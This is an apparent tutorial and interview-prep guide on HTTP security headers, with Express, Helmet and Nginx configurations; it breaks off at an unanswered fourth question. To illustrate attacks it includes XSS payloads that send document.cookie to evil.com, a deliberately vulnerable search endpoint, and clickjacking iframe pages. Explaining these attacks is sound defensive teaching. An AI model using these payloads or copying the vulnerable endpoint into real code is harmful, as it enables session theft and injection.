# Security Headers

## Overview

Security headers are **HTTP response headers** that instruct browsers how to handle your web application's content, providing crucial defense against common web vulnerabilities like XSS, clickjacking, and MIME sniffing attacks.

**Why They Matter:**
- **Easy to implement** - Add headers in middleware or web server config
- **Defense in depth** - Additional security layer beyond code fixes
- **Browser-enforced** - Security policies enforced by the browser itself
- **Widely supported** - Most modern browsers respect these headers
- **Frequently tested** in security audits and interviews

**Key Benefits:**
- **Prevent XSS attacks** with Content Security Policy
- **Block clickjacking** with X-Frame-Options
- **Enforce HTTPS** with Strict-Transport-Security
- **Disable MIME sniffing** with X-Content-Type-Options
- **Control browser features** with Permissions-Policy

## Core Security Headers

### 💡 **1. Content-Security-Policy (CSP)**

**The most powerful security header** - defines which resources browsers are allowed to load.

**Purpose:** Prevent XSS, code injection, and unauthorized resource loading.

**How It Works:**

```javascript
// CSP tells the browser: "Only load resources from these sources"
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

// Translation:
// - default-src 'self': By default, only load from same origin
// - script-src 'self' cdn.example.com: Scripts from same origin and cdn.example.com only
```

**Basic Example:**

```javascript
const express = require('express');
const app = express();

app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

**CSP Directives:**

| Directive | Description | Example |
|-----------|-------------|---------|
| **default-src** | Fallback for all directives | `default-src 'self'` |
| **script-src** | JavaScript sources | `script-src 'self' cdn.com` |
| **style-src** | CSS sources | `style-src 'self' fonts.googleapis.com` |
| **img-src** | Image sources | `img-src 'self' data: https:` |
| **font-src** | Font sources | `font-src 'self' fonts.gstatic.com` |
| **connect-src** | AJAX, WebSocket sources | `connect-src 'self' api.example.com` |
| **frame-src** | iframe sources | `frame-src 'self' youtube.com` |
| **media-src** | Audio/video sources | `media-src 'self' media.example.com` |
| **object-src** | Flash, plugins | `object-src 'none'` (recommended) |
| **base-uri** | `<base>` tag URLs | `base-uri 'self'` |
| **form-action** | Form submission targets | `form-action 'self'` |
| **frame-ancestors** | Who can embed this page | `frame-ancestors 'self'` |
| **upgrade-insecure-requests** | Upgrade HTTP to HTTPS | (no value needed) |
| **block-all-mixed-content** | Block HTTP on HTTPS page | (no value needed) |

**CSP Source Keywords:**

```
'self' - Same origin only
'none' - Block everything
'unsafe-inline' - Allow inline scripts/styles (NOT RECOMMENDED)
'unsafe-eval' - Allow eval() (NOT RECOMMENDED)
'strict-dynamic' - Trust dynamically added scripts
'nonce-{random}' - Allow scripts with matching nonce attribute
'sha256-{hash}' - Allow scripts matching SHA-256 hash
https: - Any HTTPS URL
data: - data: URIs
```

**Comprehensive CSP Example:**

```javascript
const cspDirectives = {
  "default-src": ["'self'"],
  "script-src": [
    "'self'",
    "cdn.example.com",
    "'nonce-{RANDOM}'", // Generated per request
  ],
  "style-src": [
    "'self'",
    "fonts.googleapis.com",
    "'unsafe-inline'", // Required for inline styles
  ],
  "img-src": [
    "'self'",
    "data:", // Base64 images
    "https:", // Any HTTPS image
  ],
  "font-src": [
    "'self'",
    "fonts.gstatic.com",
  ],
  "connect-src": [
    "'self'",
    "api.example.com",
    "wss://websocket.example.com",
  ],
  "frame-src": [
    "'self'",
    "www.youtube.com",
  ],
  "media-src": ["'self'"],
  "object-src": ["'none'"], // Disable Flash/plugins
  "base-uri": ["'self'"],
  "form-action": ["'self'"],
  "frame-ancestors": ["'self'"], // Clickjacking protection
  "upgrade-insecure-requests": [],
  "block-all-mixed-content": [],
};

// Convert to CSP string
const cspString = Object.entries(cspDirectives)
  .map(([directive, sources]) => {
    if (sources.length === 0) return directive;
    return `${directive} ${sources.join(' ')}`;
  })
  .join('; ');

app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', cspString);
  next();
});
```

**CSP with Nonce (Recommended for Inline Scripts):**

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate random nonce per request
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; object-src 'none'`
  );

  next();
});

// In HTML template
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head>
        <script nonce="${res.locals.cspNonce}">
          // This inline script is allowed because it has the nonce
          console.log('Allowed!');
        </script>
        <script>
          // This script is BLOCKED - no nonce
          console.log('Blocked!');
        </script>
      </head>
    </html>
  `);
});
```

**CSP Report-Only Mode (Testing):**

```javascript
// Use Content-Security-Policy-Report-Only for testing
// Violations are reported but not blocked
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; report-uri /csp-violation-report"
  );
  next();
});

// Endpoint to receive violation reports
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', JSON.stringify(req.body, null, 2));
  res.status(204).end();
});
```

**Key Insight:**
> **CSP is the most powerful XSS defense.** Even if an attacker injects malicious script into your page, CSP prevents it from executing. Always start with report-only mode, fix violations, then enforce.

---

### 💡 **2. X-Frame-Options**

Prevents your site from being embedded in an iframe (clickjacking protection).

**Purpose:** Prevent clickjacking attacks where attackers trick users into clicking hidden elements.

**Values:**

```javascript
X-Frame-Options: DENY // Never allow framing
X-Frame-Options: SAMEORIGIN // Allow framing only from same origin
X-Frame-Options: ALLOW-FROM https://example.com // Deprecated, use CSP instead
```

**Implementation:**

```javascript
// Deny all framing
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});

// Allow same-origin framing
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});
```

**Modern Alternative (CSP):**

```javascript
// More flexible than X-Frame-Options
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

**Clickjacking Attack Example:**

```html
<!-- Attacker's page -->
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0">
</iframe>
<button style="position:absolute; top:100px; left:100px">
  Click to win $1000!
</button>

<!-- User thinks they're clicking the button, but actually clicking hidden iframe -->
```

---

### 💡 **3. X-Content-Type-Options**

Prevents browsers from MIME-sniffing responses away from declared content-type.

**Purpose:** Prevent MIME confusion attacks where browsers interpret files differently than intended.

**Value:**

```javascript
X-Content-Type-Options: nosniff
```

**Implementation:**

```javascript
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});
```

**Why It Matters:**

```javascript
// Without nosniff:
// Server sends: Content-Type: text/plain
// File contains: <script>alert('XSS')</script>
// Browser might detect HTML and execute the script!

// With nosniff:
// Browser strictly follows Content-Type
// Text file is displayed as text, not executed as HTML
```

**Attack Scenario:**

```javascript
// Attacker uploads file: innocent.txt
// Content: <script>window.location='http://evil.com?cookie='+document.cookie</script>

// If server returns: Content-Type: text/plain
// Without nosniff: Browser might execute as JavaScript
// With nosniff: Browser displays as text only
```

---

### 💡 **4. Strict-Transport-Security (HSTS)**

Forces browsers to use HTTPS for all future requests.

**Purpose:** Prevent SSL stripping attacks and ensure all communication is encrypted.

**Value:**

```javascript
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Implementation:**

```javascript
app.use((req, res, next) => {
  // Only set on HTTPS responses
  if (req.secure || req.headers['x-forwarded-proto'] === 'https') {
    res.setHeader(
      'Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload'
    );
  }
  next();
});
```

**Directives:**

| Directive | Description |
|-----------|-------------|
| **max-age=seconds** | How long to remember (31536000 = 1 year) |
| **includeSubDomains** | Apply to all subdomains |
| **preload** | Allow inclusion in browser preload list |

**HSTS Preload List:**

```
Submit your site to hstspreload.org
Requirements:
✅ Serve valid HTTPS certificate
✅ Redirect all HTTP to HTTPS
✅ Serve HSTS header on base domain
✅ max-age >= 31536000 (1 year)
✅ Include includeSubDomains
✅ Include preload
```

**SSL Stripping Attack (Prevented by HSTS):**

```
1. User types: example.com (no https://)
2. Browser requests: http://example.com
3. Attacker intercepts (Man-in-the-middle)
4. Attacker forwards request as HTTP
5. Server redirects to HTTPS, but attacker keeps connection as HTTP
6. User stays on HTTP, credentials stolen!

With HSTS:
1. Browser remembers: "Always use HTTPS for example.com"
2. User types: example.com
3. Browser automatically requests: https://example.com
4. Attacker can't intercept - connection is encrypted from start
```

---

### 💡 **5. Referrer-Policy**

Controls how much referrer information is sent with requests.

**Purpose:** Privacy protection and prevent information leakage in URLs.

**Values:**

```javascript
Referrer-Policy: no-referrer // Never send referrer
Referrer-Policy: no-referrer-when-downgrade // Default - no referrer on HTTPS → HTTP
Referrer-Policy: origin // Send origin only
Referrer-Policy: origin-when-cross-origin // Full URL for same-origin, origin for cross-origin
Referrer-Policy: same-origin // Only send referrer for same-origin requests
Referrer-Policy: strict-origin // Send origin, but not on HTTPS → HTTP
Referrer-Policy: strict-origin-when-cross-origin // Recommended
Referrer-Policy: unsafe-url // Always send full URL (NOT RECOMMENDED)
```

**Implementation:**

```javascript
app.use((req, res, next) => {
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});
```

**Why It Matters:**

```javascript
// User visits: https://example.com/dashboard?token=secret123
// Clicks link to external site: https://external.com

// Without Referrer-Policy:
// External site receives: Referer: https://example.com/dashboard?token=secret123
// SECRET TOKEN LEAKED!

// With strict-origin-when-cross-origin:
// External site receives: Referer: https://example.com
// Token protected!
```

**Comparison:**

| Policy | Same-Origin | Cross-Origin HTTPS | Cross-Origin HTTP Downgrade |
|--------|-------------|-------------------|---------------------------|
| **no-referrer** | ❌ | ❌ | ❌ |
| **origin** | Origin only | Origin only | Origin only |
| **strict-origin** | Full URL | Origin only | ❌ |
| **strict-origin-when-cross-origin** | Full URL | Origin only | ❌ |
| **same-origin** | Full URL | ❌ | ❌ |

---

### 💡 **6. Permissions-Policy (Feature-Policy)**

Controls which browser features and APIs can be used.

**Purpose:** Limit attack surface by disabling unnecessary browser features.

**Implementation:**

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=()'
  );
  next();
});
```

**Common Features:**

```javascript
// Disable all features
Permissions-Policy: geolocation=(), microphone=(), camera=()

// Allow for same origin only
Permissions-Policy: geolocation=(self), microphone=(self)

// Allow for specific origins
Permissions-Policy: payment=(self "https://stripe.com")

// Features to consider disabling:
accelerometer=()        // Motion sensors
ambient-light-sensor=() // Light sensor
autoplay=()            // Autoplay media
battery=()             // Battery API
camera=()              // Camera access
display-capture=()     // Screen sharing
document-domain=()     // document.domain
encrypted-media=()     // DRM
fullscreen=()          // Fullscreen API
geolocation=()         // Location
gyroscope=()           // Gyroscope
magnetometer=()        // Magnetometer
microphone=()          // Microphone
midi=()                // MIDI devices
payment=()             // Payment API
picture-in-picture=()  // PiP
publickey-credentials-get=() // WebAuthn
screen-wake-lock=()    // Screen wake
usb=()                 // USB access
xr-spatial-tracking=() // WebXR
```

**Comprehensive Example:**

```javascript
const permissions = [
  'accelerometer=()',
  'ambient-light-sensor=()',
  'autoplay=()',
  'battery=()',
  'camera=()',
  'display-capture=()',
  'document-domain=()',
  'encrypted-media=()',
  'fullscreen=(self)',
  'geolocation=()',
  'gyroscope=()',
  'magnetometer=()',
  'microphone=()',
  'midi=()',
  'payment=()',
  'picture-in-picture=()',
  'publickey-credentials-get=(self)',
  'screen-wake-lock=()',
  'sync-xhr=()',
  'usb=()',
  'xr-spatial-tracking=()',
].join(', ');

app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', permissions);
  next();
});
```

---

### 💡 **7. X-XSS-Protection**

Legacy XSS filter (mostly deprecated).

**Status:** **Deprecated** - Modern browsers removed XSS Auditor due to bypasses.

**Value:**

```javascript
X-XSS-Protection: 0 // Disable (recommended)
X-XSS-Protection: 1 // Enable basic XSS filtering
X-XSS-Protection: 1; mode=block // Block page on XSS detection
```

**Recommendation:**

```javascript
// Disable X-XSS-Protection (can cause vulnerabilities)
app.use((req, res, next) => {
  res.setHeader('X-XSS-Protection', '0');
  next();
});

// Rely on Content-Security-Policy instead
```

**Why Disable:**
- XSS Auditor had bypasses
- Could be abused to create vulnerabilities
- CSP is more effective
- Major browsers removed the feature

---

### 💡 **8. Cross-Origin Policies**

Control how documents interact across origins.

**Cross-Origin-Opener-Policy (COOP):**

```javascript
Cross-Origin-Opener-Policy: same-origin
// Isolates browsing context - prevents window.opener access

app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  next();
});
```

**Cross-Origin-Embedder-Policy (COEP):**

```javascript
Cross-Origin-Embedder-Policy: require-corp
// Requires explicit permission for cross-origin resources

app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
  next();
});
```

**Cross-Origin-Resource-Policy (CORP):**

```javascript
Cross-Origin-Resource-Policy: same-origin
// Prevents other origins from loading this resource

app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  next();
});
```

## Complete Implementation

### Using Helmet.js (Recommended)

```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// ✅ Basic Helmet (applies sensible defaults)
app.use(helmet());

// ✅ Custom Helmet configuration
app.use(
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "cdn.example.com"],
        styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
        imgSrc: ["'self'", "data:", "https:"],
        fontSrc: ["'self'", "fonts.gstatic.com"],
        connectSrc: ["'self'", "api.example.com"],
        frameSrc: ["'self'", "www.youtube.com"],
        objectSrc: ["'none'"],
        upgradeInsecureRequests: [],
      },
    },

    // Strict Transport Security
    hsts: {
      maxAge: 31536000, // 1 year
      includeSubDomains: true,
      preload: true,
    },

    // X-Frame-Options
    frameguard: {
      action: 'deny', // or 'sameorigin'
    },

    // X-Content-Type-Options
    noSniff: true,

    // Referrer-Policy
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },

    // Permissions-Policy
    permissionsPolicy: {
      features: {
        geolocation: [],
        microphone: [],
        camera: [],
        payment: [],
      },
    },

    // X-DNS-Prefetch-Control
    dnsPrefetchControl: {
      allow: false,
    },

    // X-Download-Options (IE8+)
    ieNoOpen: true,

    // X-Powered-By (Hide Express)
    hidePoweredBy: true,
  })
);

app.get('/', (req, res) => {
  res.send('Hello with secure headers!');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

### Production-Ready Configuration

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// Generate nonce for CSP
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Comprehensive security headers
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => `'nonce-${res.locals.cspNonce}'`,
          "cdn.jsdelivr.net",
          "cdn.example.com",
        ],
        styleSrc: [
          "'self'",
          "'unsafe-inline'", // Required for many CSS frameworks
          "fonts.googleapis.com",
        ],
        imgSrc: [
          "'self'",
          "data:",
          "https:",
          "blob:",
        ],
        fontSrc: [
          "'self'",
          "fonts.gstatic.com",
          "data:",
        ],
        connectSrc: [
          "'self'",
          "api.example.com",
          "wss://websocket.example.com",
        ],
        frameSrc: [
          "'self'",
          "www.youtube.com",
          "www.youtube-nocookie.com",
        ],
        mediaSrc: ["'self'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        frameAncestors: ["'self'"],
        upgradeInsecureRequests: [],
        blockAllMixedContent: [],
      },
      reportOnly: false, // Set to true for testing
    },

    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },

    frameguard: {
      action: 'sameorigin',
    },

    noSniff: true,

    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },

    permissionsPolicy: {
      features: {
        accelerometer: [],
        ambientLightSensor: [],
        autoplay: [],
        battery: [],
        camera: [],
        displayCapture: [],
        documentDomain: [],
        encryptedMedia: [],
        fullscreen: ["'self'"],
        geolocation: [],
        gyroscope: [],
        magnetometer: [],
        microphone: [],
        midi: [],
        payment: [],
        pictureInPicture: [],
        publicKeyCredentials: ["'self'"],
        screenWakeLock: [],
        syncXhr: [],
        usb: [],
        xrSpatialTracking: [],
      },
    },

    crossOriginOpenerPolicy: {
      policy: 'same-origin',
    },

    crossOriginEmbedderPolicy: {
      policy: 'require-corp',
    },

    crossOriginResourcePolicy: {
      policy: 'same-origin',
    },

    dnsPrefetchControl: {
      allow: false,
    },

    ieNoOpen: true,
    hidePoweredBy: true,
  })
);

// Additional custom headers
app.use((req, res, next) => {
  // Remove X-XSS-Protection (causes vulnerabilities)
  res.removeHeader('X-XSS-Protection');

  // Server header
  res.setHeader('Server', 'webserver'); // Generic name

  // Cache control for sensitive pages
  if (req.path.includes('/dashboard') || req.path.includes('/account')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
  }

  next();
});

// Routes
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Secure App</title>
        <script nonce="${res.locals.cspNonce}">
          console.log('This script is allowed by CSP nonce');
        </script>
      </head>
      <body>
        <h1>Secure Application</h1>
      </body>
    </html>
  `);
});

app.listen(3000, () => {
  console.log('Secure server running on port 3000');
});
```

### Nginx Configuration

```nginx
# /etc/nginx/sites-available/example.com

server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;

    # Content Security Policy
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' fonts.gstatic.com; connect-src 'self' api.example.com; frame-src 'self'; object-src 'none'; upgrade-insecure-requests; block-all-mixed-content" always;

    # Cross-Origin Policies
    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
    add_header Cross-Origin-Resource-Policy "same-origin" always;

    # Hide server version
    server_tokens off;

    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

## Testing Security Headers

### Online Tools

**1. SecurityHeaders.com:**

```bash
# Test your site
https://securityheaders.com/?q=https://example.com&followRedirects=on

# Provides letter grade (A+ to F)
# Shows missing headers
# Gives recommendations
```

**2. Mozilla Observatory:**

```bash
# Comprehensive security analysis
https://observatory.mozilla.org/analyze/example.com

# Tests:
✓ Security headers
✓ TLS configuration
✓ Cookie security
✓ Subresource integrity
✓ HTTPS redirects
```

**3. Manual Testing with curl:**

```bash
# Check all headers
curl -I https://example.com

# Check specific header
curl -I https://example.com | grep -i "content-security-policy"

# Check with redirects
curl -IL https://example.com
```

### Browser DevTools

```javascript
// Open DevTools → Network tab
// Click on any request
// Check "Headers" section
// Look for "Response Headers"

// Check CSP violations in Console:
// Violations are logged automatically
// Look for messages like:
// "Refused to load script from 'https://evil.com/script.js' because it violates CSP directive..."
```

### Automated Testing

```javascript
const axios = require('axios');

async function checkSecurityHeaders(url) {
  try {
    const response = await axios.get(url);
    const headers = response.headers;

    const requiredHeaders = {
      'strict-transport-security': 'HSTS',
      'content-security-policy': 'CSP',
      'x-frame-options': 'Clickjacking Protection',
      'x-content-type-options': 'MIME Sniffing Protection',
      'referrer-policy': 'Referrer Policy',
    };

    console.log('Security Headers Check:\n');

    for (const [header, description] of Object.entries(requiredHeaders)) {
      if (headers[header]) {
        console.log(`✅ ${description}: ${headers[header]}`);
      } else {
        console.log(`❌ ${description}: MISSING`);
      }
    }
  } catch (error) {
    console.error('Error checking headers:', error.message);
  }
}

checkSecurityHeaders('https://example.com');
```

## Interview Questions

### Q1: What are security headers and why are they important?

**Answer:**

Security headers are **HTTP response headers** that instruct browsers how to handle web content, providing an additional security layer against common attacks.

**Why They're Important:**

```
✅ Easy to implement - Just add headers
✅ Browser-enforced - Security policies enforced by browser
✅ Defense in depth - Additional layer beyond code fixes
✅ Wide support - Most modern browsers respect them
✅ Prevent common attacks - XSS, clickjacking, MIME sniffing
```

**Core Security Headers:**

| Header | Purpose | Attack Prevented |
|--------|---------|------------------|
| **Content-Security-Policy** | Control resource loading | XSS, code injection |
| **Strict-Transport-Security** | Force HTTPS | SSL stripping, MITM |
| **X-Frame-Options** | Prevent framing | Clickjacking |
| **X-Content-Type-Options** | Disable MIME sniffing | MIME confusion |
| **Referrer-Policy** | Control referrer info | Information leakage |
| **Permissions-Policy** | Control browser features | Unauthorized API access |

**Real-World Impact:**

```javascript
// Without Security Headers:
// ❌ XSS attacks succeed
// ❌ Site can be framed (clickjacking)
// ❌ MIME sniffing exploits work
// ❌ Man-in-the-middle attacks possible
// ❌ Sensitive URLs leaked via Referer

// With Security Headers:
// ✅ CSP blocks malicious scripts
// ✅ X-Frame-Options prevents framing
// ✅ nosniff prevents MIME attacks
// ✅ HSTS forces HTTPS
// ✅ Referrer-Policy protects URLs
```

**Example Attack Prevented:**

```javascript
// Attacker injects XSS:
<script src="https://evil.com/steal.js"></script>

// Without CSP: Script loads and executes
// Result: Cookies stolen, session hijacked

// With CSP:
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

// Browser blocks the script:
// "Refused to load script from 'https://evil.com/steal.js' because it violates CSP directive"
// Result: Attack prevented!
```

**Key Insight:**
> **Security headers are easy wins.** They're simple to implement (often just 10 lines of code with Helmet.js) and provide powerful protection. They don't replace secure coding but add crucial defense in depth. Always implement them - there's no good reason not to.

---

### Q2: What is Content Security Policy (CSP) and how does it prevent XSS?

**Answer:**

Content Security Policy is the **most powerful security header** - it defines a whitelist of sources from which browsers are allowed to load resources.

**How It Works:**

```javascript
// CSP Header:
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

// Translation:
// 1. default-src 'self': By default, only load from same origin
// 2. script-src 'self' cdn.example.com: Scripts only from self or cdn.example.com

// If attacker injects:
<script src="https://evil.com/steal.js"></script>

// Browser blocks it:
// "Refused to load script from 'https://evil.com/steal.js' because it violates CSP directive 'script-src self cdn.example.com'"
```

**How CSP Prevents XSS:**

**Traditional XSS (Without CSP):**

```javascript
// Vulnerable code
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Attacker visits:
// /search?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>

// Without CSP:
// Script executes → cookies stolen
```

**With CSP:**

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});

app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Same attack:
// /search?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>

// CSP blocks it:
// Inline scripts are blocked unless 'unsafe-inline' is allowed
// External script from evil.com is blocked by script-src 'self'
// Result: Attack fails!
```

**CSP Directives for XSS Prevention:**

```javascript
Content-Security-Policy:
  default-src 'self';                    // Default: same origin only
  script-src 'self' cdn.example.com;    // Scripts from self and CDN
  object-src 'none';                     // No Flash/plugins
  base-uri 'self';                       // Prevent <base> tag injection
  form-action 'self';                    // Forms only submit to self
```

**Handling Inline Scripts (Nonces):**

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'`
  );

  next();
});

app.get('/', (req, res) => {
  res.send(`
    <html>
      <head>
        <!-- ✅ Allowed - has matching nonce -->
        <script nonce="${res.locals.nonce}">
          console.log('Legitimate inline script');
        </script>

        <!-- ❌ Blocked - injected XSS has no nonce -->
        <script>alert('XSS')</script>
      </head>
    </html>
  `);
});
```

**CSP Levels:**

| Feature | CSP Level 1 | CSP Level 2 | CSP Level 3 |
|---------|-------------|-------------|-------------|
| **Basic directives** | ✅ | ✅ | ✅ |
| **Nonces** | ❌ | ✅ | ✅ |
| **Hashes** | ❌ | ✅ | ✅ |
| **'strict-dynamic'** | ❌ | ✅ | ✅ |
| **Worker & manifest** | ❌ | ✅ | ✅ |
| **'unsafe-hashes'** | ❌ | ❌ | ✅ |

**Testing CSP (Report-Only Mode):**

```javascript
// Use report-only mode first to avoid breaking your site
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; script-src 'self'; report-uri /csp-violations"
  );
  next();
});

// Collect violation reports
app.post('/csp-violations', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', JSON.stringify(req.body, null, 2));
  // Log to monitoring system
  res.status(204).end();
});

// Violations look like:
{
  "csp-report": {
    "blocked-uri": "https://evil.com/steal.js",
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "original-policy": "default-src 'self'; script-src 'self'"
  }
}
```

**Key Insight:**
> **CSP is the strongest XSS defense.** Even if an attacker successfully injects malicious code into your HTML (through XSS vulnerability), CSP prevents it from executing. Always implement CSP - start with report-only mode, fix violations, then enforce.

---

### Q3: What is the difference between X-Frame-Options and CSP frame-ancestors?

**Answer:**

Both headers prevent clickjacking, but **CSP frame-ancestors is more flexible and modern**.

**X-Frame-Options (Legacy):**

```javascript
X-Frame-Options: DENY // Never allow framing
X-Frame-Options: SAMEORIGIN // Allow only same-origin framing
X-Frame-Options: ALLOW-FROM https://example.com // Deprecated
```

**CSP frame-ancestors (Modern):**

```javascript
Content-Security-Policy: frame-ancestors 'self' // Same as SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none' // Same as DENY
Content-Security-Policy: frame-ancestors 'self' https://trusted.com https://another.com // Multiple origins
```

**Comparison:**

| Feature | X-Frame-Options | CSP frame-ancestors |
|---------|----------------|---------------------|
| **Syntax** | Simple | More flexible |
| **Multiple origins** | ❌ No | ✅ Yes |
| **Part of CSP** | ❌ No | ✅ Yes |
| **Browser support** | Excellent | Good (modern browsers) |
| **Recommended** | Legacy support | Primary choice |

**X-Frame-Options Limitations:**

```javascript
// ❌ Can only specify ONE origin (ALLOW-FROM)
X-Frame-Options: ALLOW-FROM https://example.com

// ❌ Can't specify multiple trusted origins
// ❌ ALLOW-FROM is deprecated and not supported in Chrome/Safari
```

**CSP frame-ancestors Advantages:**

```javascript
// ✅ Can specify multiple origins
Content-Security-Policy: frame-ancestors 'self' https://trusted1.com https://trusted2.com

// ✅ More flexible control
Content-Security-Policy: frame-ancestors https://*.example.com

// ✅ Part of comprehensive CSP policy
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  frame-ancestors 'self' https://trusted.com
```

**Real-World Example:**

```javascript
// Company has main site and partner portal
// Both should be able to embed the app

// ❌ X-Frame-Options can't do this:
X-Frame-Options: SAMEORIGIN // Only allows same origin
X-Frame-Options: ALLOW-FROM https://partner.com // Only ONE origin, deprecated

// ✅ CSP frame-ancestors can:
Content-Security-Policy: frame-ancestors 'self' https://partner.com https://other-partner.com
```

**Implementation:**

```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// ✅ Modern approach (CSP frame-ancestors)
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        frameAncestors: ["'self'", "https://trusted.com"],
      },
    },
  })
);

// ✅ Backwards compatibility (both headers)
app.use((req, res, next) => {
  // X-Frame-Options for older browsers
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  // CSP frame-ancestors for modern browsers
  res.setHeader(
    'Content-Security-Policy',
    "frame-ancestors 'self' https://trusted.com"
  );

  next();
});
```

**Clickjacking Attack (Both Prevent):**

```html
<!-- Attacker's page -->
<!DOCTYPE html>
<html>
  <head>
    <style>
      iframe {
        position: absolute;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Nearly invisible */
        width: 100%;
        height: 100%;
      }
      button {
        position: absolute;
        top: 200px;
        left: 200px;
        font-size: 20px;
      }
    </style>
  </head>
  <body>
    <!-- Invisible iframe with your site -->
    <iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>

    <!-- Visible fake button -->
    <button>Click here to win $1000!</button>

    <!-- User thinks they click the button, actually clicking hidden iframe -->
  </body>
</html>
```

**With X-Frame-Options: DENY or frame-ancestors 'none':**

```javascript
// Browser refuses to load iframe:
// "Refused to display 'https://bank.com' in a frame because it set 'X-Frame-Options' to 'deny'."
// Attack fails!
```

**When to Use Which:**

```
Use X-Frame-Options:
✅ Need broad browser support (including old IE)
✅ Simple use case (DENY or SAMEORIGIN)
✅ Not using CSP yet

Use CSP frame-ancestors:
✅ Modern browsers only
✅ Need to whitelist multiple origins
✅ Already using CSP
✅ Need flexible rules

Best Practice:
✅ Use BOTH for defense in depth
✅ X-Frame-Options for backwards compatibility
✅ CSP frame-ancestors as primary control
```

**Key Insight:**
> **Use CSP frame-ancestors for new projects.** It's more flexible, part of comprehensive CSP, and better supported in modern browsers. For maximum compatibility, set both headers - browsers will respect CSP if supported, fall back to X-Frame-Options otherwise.

---

### Q4: How would you implement security headers in a production Express application?

**Answer:**

